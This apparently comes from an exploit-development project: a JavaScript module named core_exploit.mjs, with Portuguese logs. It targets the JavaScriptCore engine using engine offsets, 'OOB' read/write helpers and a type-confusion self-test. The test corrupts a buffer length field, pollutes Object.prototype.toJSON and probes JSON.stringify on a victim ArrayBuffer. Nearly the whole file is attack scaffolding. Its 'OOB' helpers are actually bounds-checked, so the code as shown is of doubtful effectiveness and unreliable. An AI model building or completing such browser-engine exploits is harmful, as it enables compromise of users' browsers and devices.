// js/core_exploit.mjs
import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false;

const toHexHelper = (val, bits = 32) => toHex(val, bits);

export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) {
    // ... (código inalterado)
    const FNAME_CLEAR = 'CoreExploit.clearOOBEnvironment';
    if (isOOBEnvironmentSetup || options.force_clear_even_if_not_setup) {
        // log(`Limpando ambiente OOB... (Setup anterior: ${isOOBEnvironmentSetup})`, 'info', FNAME_CLEAR);
    }
    oob_array_buffer_real = null;
    oob_dataview_real = null;
    if (isOOBEnvironmentSetup) { // Apenas loga que foi limpo se estava realmente setup
        // log(`Ambiente OOB limpo.`, 'info', FNAME_CLEAR);
    }
    isOOBEnvironmentSetup = false; // Resetar a flag
}

export function getOOBAllocationSize() {
    // ... (código inalterado)
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.ALLOCATION_SIZE;
}

export function getBaseOffsetInDV() {
    // ... (código inalterado)
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.BASE_OFFSET_IN_DV;
}
export function getInitialBufferSize() {
    // ... (código inalterado)
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.INITIAL_BUFFER_SIZE;
}

export async function triggerOOB_primitive(options = { force_reinit: false }) {
    // ... (código inalterado)
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';

    if (isOOBEnvironmentSetup && !options.force_reinit) {
        if (oob_array_buffer_real && oob_dataview_real && oob_array_buffer_real.byteLength === getOOBAllocationSize() && oob_dataview_real.buffer === oob_array_buffer_real) {
            // log(`Ambiente OOB já configurado e parece válido. Pulando reconfiguração.`, 'info', FNAME_TRIGGER);
            return true;
        } else {
            log(`Ambiente OOB marcado como configurado, mas as variáveis são inválidas/inconsistentes. Forçando re-inicialização.`, 'warn', FNAME_TRIGGER);
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }
    }

    log(`--- Iniciando Configuração do Ambiente OOB (Force reinit: ${options.force_reinit}, Setup anterior: ${isOOBEnvironmentSetup}) ---`, 'test', FNAME_TRIGGER);
    const currentAllocSize = getOOBAllocationSize();

    log(`   Config OOB: AllocSize=${currentAllocSize}`, 'info', FNAME_TRIGGER);

    clearOOBEnvironment({ force_clear_even_if_not_setup: true });

    try {
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize);
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);

        log(`Ambiente para Operações OOB CONFIGURADO com sucesso.`, 'good', FNAME_TRIGGER);
        log(`   oob_array_buffer_real (total): ${oob_array_buffer_real.byteLength} bytes`, 'info', FNAME_TRIGGER);
        log(`   oob_dataview_real (janela controlada): offset=${oob_dataview_real.byteOffset}, length=${oob_dataview_real.byteLength} bytes`, 'info', FNAME_TRIGGER);

        isOOBEnvironmentSetup = true;
        log(`--- Configuração do Ambiente OOB Concluída ---`, 'test', FNAME_TRIGGER);
        return true;

    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER);
        console.error(e);
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        throw e;
    }
}

export function oob_read_absolute(absolute_offset, byteLength) {
    // ... (código inalterado)
    const FNAME_READ = 'CoreExploit.oob_read_absolute';
    if (!isOOBEnvironmentSetup || !oob_dataview_real || oob_dataview_real.buffer.byteLength === 0) {
        log(`ERRO: Ambiente OOB não inicializado ou inválido para leitura em ${toHexHelper(absolute_offset)}`, "error", FNAME_READ);
        if (oob_dataview_real && oob_dataview_real.buffer.byteLength === 0) {
            isOOBEnvironmentSetup = false;
        }
        throw new Error("Ambiente OOB não inicializado ou inválido para leitura.");
    }

    const relative_offset = absolute_offset;

    if (relative_offset < 0 || (relative_offset + byteLength) > oob_dataview_real.byteLength) {
        const errorMsg = `Leitura OOB (abs ${toHexHelper(absolute_offset)} -> rel ${toHexHelper(relative_offset)}, tam ${byteLength}) fora dos limites da DataView (0-${oob_dataview_real.byteLength})`;
        log(errorMsg, "error", FNAME_READ);
        throw new RangeError(errorMsg);
    }

    try {
        switch (byteLength) {
            case 1: return oob_dataview_real.getUint8(relative_offset);
            case 2: return oob_dataview_real.getUint16(relative_offset, true);
            case 4: return oob_dataview_real.getUint32(relative_offset, true);
            case 8: {
                const low = oob_dataview_real.getUint32(relative_offset, true);
                const high = oob_dataview_real.getUint32(relative_offset + 4, true);
                return new AdvancedInt64(low, high);
            }
            default:
                log(`ERRO: Tamanho de leitura inválido: ${byteLength}`, "error", FNAME_READ);
                throw new Error(`Invalid byteLength for read: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_READ} ao ler de ${toHexHelper(absolute_offset)} (rel ${toHexHelper(relative_offset)}): ${e.message}`, "critical", FNAME_READ);
        if (e.message.includes("detached") || (oob_dataview_real && oob_dataview_real.buffer.byteLength === 0)) {
            isOOBEnvironmentSetup = false;
        }
        throw e;
    }
}

export function oob_write_absolute(absolute_offset, value, byteLength) {
    // ... (código inalterado)
    const FNAME_WRITE = 'CoreExploit.oob_write_absolute';
    if (!isOOBEnvironmentSetup || !oob_dataview_real || oob_dataview_real.buffer.byteLength === 0) {
        log(`ERRO: Ambiente OOB não inicializado ou inválido para escrita em ${toHexHelper(absolute_offset)}`, "error", FNAME_WRITE);
        if (oob_dataview_real && oob_dataview_real.buffer.byteLength === 0) {
            isOOBEnvironmentSetup = false;
        }
        throw new Error("Ambiente OOB não inicializado ou inválido para escrita.");
    }

    const relative_offset = absolute_offset;

    if (relative_offset < 0 || (relative_offset + byteLength) > oob_dataview_real.byteLength) {
        const errorMsg = `Escrita OOB (abs ${toHexHelper(absolute_offset)} -> rel ${toHexHelper(relative_offset)}, tam ${byteLength}) fora dos limites da DataView (0-${oob_dataview_real.byteLength})`;
        log(errorMsg, "error", FNAME_WRITE);
        throw new RangeError(errorMsg);
    }

    try {
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(relative_offset, Number(value)); break;
            case 2: oob_dataview_real.setUint16(relative_offset, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(relative_offset, Number(value), true); break;
            case 8:
                if (!isAdvancedInt64Object(value)) {
                    throw new TypeError("Valor para escrita de 8 bytes deve ser AdvancedInt64");
                }
                oob_dataview_real.setUint32(relative_offset, value.low(), true);
                oob_dataview_real.setUint32(relative_offset + 4, value.high(), true);
                break;
            default:
                log(`ERRO: Tamanho de escrita inválido: ${byteLength}`, "error", FNAME_WRITE);
                throw new Error(`Invalid byteLength for write: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_WRITE} ao escrever em ${toHexHelper(absolute_offset)} (rel ${toHexHelper(relative_offset)}): ${e.message}`, "critical", FNAME_WRITE);
        if (e.message.includes("detached") || (oob_dataview_real && oob_dataview_real.buffer.byteLength === 0)) {
            isOOBEnvironmentSetup = false;
        }
        throw e;
    }
}

export async function selfTestOOBReadWrite(logFnParam) {
    // ... (código inalterado)
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestOOBReadWrite';
    currentLog(`--- Iniciando Auto-Teste de OOB R/W (com re-inicialização forçada) ---`, 'test', FNAME_TEST);
    try {
        await triggerOOB_primitive({ force_reinit: true });

        const test_offset = 0x50;
        const test_val32 = 0x11223344;
        const test_val64 = new AdvancedInt64(0xAABBCCDD, 0xEEFF0011);

        currentLog(`Escrevendo ${toHexHelper(test_val32)} em offset absoluto ${toHexHelper(test_offset)}`, "info", FNAME_TEST);
        oob_write_absolute(test_offset, test_val32, 4);
        const read_val32 = oob_read_absolute(test_offset, 4);
        if (read_val32 === test_val32) {
            currentLog(`SUCESSO: Lido ${toHexHelper(read_val32)} corretamente (32bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${toHexHelper(read_val32)}, esperado ${toHexHelper(test_val32)}.`, "error", FNAME_TEST); throw new Error("Self-test 32bit failed");
        }

        const next_offset = test_offset + 8;
        currentLog(`Escrevendo ${test_val64.toString(true)} em offset absoluto ${toHexHelper(next_offset)}`, "info", FNAME_TEST);
        oob_write_absolute(next_offset, test_val64, 8);
        const read_val64 = oob_read_absolute(next_offset, 8);
        if (isAdvancedInt64Object(read_val64) && read_val64.equals(test_val64)) {
            currentLog(`SUCESSO: Lido ${read_val64.toString(true)} corretamente (64bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${isAdvancedInt64Object(read_val64) ? read_val64.toString(true) : String(read_val64)}, esperado ${test_val64.toString(true)}.`, "error", FNAME_TEST); throw new Error("Self-test 64bit failed");
        }
        currentLog(`--- Auto-Teste de OOB R/W Concluído ---`, 'test', FNAME_TEST);
        return true;
    } catch (e) {
        currentLog(`ERRO no Auto-Teste OOB R/W: ${e.message}`, 'critical', FNAME_TEST);
        return false;
    }
}

export function isOOBReady() {
    // ... (código inalterado)
    return isOOBEnvironmentSetup &&
           oob_array_buffer_real instanceof ArrayBuffer &&
           oob_dataview_real instanceof DataView &&
           oob_array_buffer_real.byteLength > 0 &&
           oob_dataview_real.buffer === oob_array_buffer_real &&
           oob_dataview_real.buffer.byteLength > 0;
}

// ---- FUNÇÃO DE AUTO-TESTE PARA TYPE CONFUSION (Revisão para Máxima Fidelidade à Lógica Original Funcional) ----
export async function selfTestArrayBufferTypeConfusion(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestArrayBufferTypeConfusion';
    currentLog(`--- Iniciando Auto-Teste de Type Confusion (ArrayBuffer Vítima) - Tentativa de Fidelidade ---`, 'test', FNAME_TEST);

    let originalToJSONDescriptor = null;
    let pollutionApplied = false;
    // Variável para armazenar os detalhes da sonda, espelhando 'toJSON_call_details_v28'
    // mas local para esta função de teste para manter o isolamento.
    let local_probe_details = null;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Falha ao inicializar ambiente OOB para teste de Type Confusion.");
        }

        const mLengthOffsetInView = parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
        if (isNaN(mLengthOffsetInView)) {
            currentLog("ERRO CRÍTICO: JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET não é um número válido.", "critical", FNAME_TEST);
            return false;
        }
        const corruptionTargetOffsetInOOBAB = 0x58 + mLengthOffsetInView;
        const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
        const VICTIM_AB_SIZE = 64;

        currentLog(`   Alvo da corrupção OOB: ${toHexHelper(corruptionTargetOffsetInOOBAB)} (Base 0x58 + M_LENGTH_OFFSET ${toHexHelper(mLengthOffsetInView)})`, 'info', FNAME_TEST);

        currentLog(`   PASSO 1: Escrevendo valor CRÍTICO ${toHexHelper(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHexHelper(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        currentLog(`     Escrita OOB crítica realizada.`, "info", FNAME_TEST);

        await PAUSE(100); // Manter a pausa

        let victim_ab = new ArrayBuffer(VICTIM_AB_SIZE);
        currentLog(`   PASSO 2: victim_ab (${VICTIM_AB_SIZE} bytes) criado.`, "info", FNAME_TEST);

        // Sonda toJSON - Replicando a estrutura e comportamento da 'toJSON_V28_MinimalProbe'
        const toJSON_HighlyFidelityProbe = function() {
            // Inicializa/reseta o objeto de detalhes a cada chamada da sonda, como na original.
            local_probe_details = {
                probe_variant: "CoreExploit_HighFidelityProbe", // Identificador da sonda
                this_type_in_toJSON: "N/A_before_call", // Valor padrão
                error_in_toJSON: null,                  // Erro padrão
                probe_called: false                     // Flag de chamada
            };
            try {
                local_probe_details.probe_called = true; // Marca que a sonda foi executada
                local_probe_details.this_type_in_toJSON = Object.prototype.toString.call(this);
            } catch (e) {
                local_probe_details.error_in_toJSON = `${e.name}: ${e.message}`;
            }
            // Retorna um objeto simples, como na sonda original que funcionou
            return { minimal_probe_executed: true };
        };

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        Object.defineProperty(Object.prototype, ppKey, {
            value: toJSON_HighlyFidelityProbe, // Usando a nova sonda
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        currentLog(`     Object.prototype.${ppKey} poluído com sonda de alta fidelidade.`, "info", FNAME_TEST);

        // Resetar 'local_probe_details' antes da chamada crítica para garantir que
        // estamos analisando os dados desta execução da sonda. A própria sonda já o reinicializa,
        // mas uma segurança adicional para o estado externo à sonda.
        local_probe_details = null;
        let stringifyOutput = null;

        currentLog(`     Chamando JSON.stringify(victim_ab)...`, "warn", FNAME_TEST);
        try {
            stringifyOutput = JSON.stringify(victim_ab);
            currentLog(`     JSON.stringify completou. Resultado da sonda (objeto retornado): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_TEST);
        } catch (e) {
            currentLog(`     ERRO durante JSON.stringify: ${e.name} - ${e.message}`, "error", FNAME_TEST);
            // Se um erro ocorreu durante stringify e a sonda não foi chamada para preencher local_probe_details.
            if (local_probe_details === null) {
                 local_probe_details = { // Cria um objeto de detalhes para registrar o erro
                    probe_variant: "CoreExploit_HighFidelityProbe",
                    this_type_in_toJSON: `Error during stringify: ${e.name}`,
                    error_in_toJSON: `${e.name}: ${e.message}`,
                    probe_called: false // A sonda em si pode não ter sido chamada
                 };
            } else if (local_probe_details.error_in_toJSON === null && e) {
                // Se a sonda foi chamada mas o erro foi no stringify externo à sonda
                local_probe_details.error_in_toJSON = `Outer stringify error: ${e.name}: ${e.message}`;
            }
        }

        // Verificação da Confusão de Tipo usando 'local_probe_details'
        currentLog(`     Detalhes da sonda (local_probe_details): ${local_probe_details ? JSON.stringify(local_probe_details) : 'N/A'}`, "leak", FNAME_TEST);

        if (local_probe_details && local_probe_details.probe_called && local_probe_details.this_type_in_toJSON === "[object Object]") {
            currentLog(`   SUCESSO: Confusão de tipo detectada! 'this' é [object Object] como esperado.`, "vuln", FNAME_TEST);
        } else if (local_probe_details && local_probe_details.this_type_in_toJSON === "[object ArrayBuffer]") {
            currentLog(`   FALHA: Nenhuma confusão de tipo detectada. 'this' é [object ArrayBuffer].`, "error", FNAME_TEST);
            throw new Error("Type confusion self-test failed: 'this' was ArrayBuffer.");
        } else {
            let detailsMsg = local_probe_details ? local_probe_details.this_type_in_toJSON : "sonda não forneceu detalhes";
            if (local_probe_details && local_probe_details.error_in_toJSON) {
                detailsMsg += ` (Erro na sonda: ${local_probe_details.error_in_toJSON})`;
            }
            currentLog(`   FALHA ou INCONCLUSIVO: 'this' na sonda: ${detailsMsg}. Esperado [object Object].`, "error", FNAME_TEST);
            throw new Error(`Type confusion self-test failed or inconclusive: this_type was ${detailsMsg}.`);
        }

        currentLog(`--- Auto-Teste de Type Confusion CONCLUÍDO COM SUCESSO ---`, 'test', FNAME_TEST);
        return true;

    } catch (e) {
        currentLog(`ERRO no Auto-Teste de Type Confusion: ${e.message}${e.stack ? '\\n' + e.stack : ''}`, 'critical', FNAME_TEST);
        return false;
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptor);
            } else {
                delete Object.prototype['toJSON'];
            }
            currentLog(`     Object.prototype.toJSON restaurado.`, "info", FNAME_TEST);
        }
    }
}
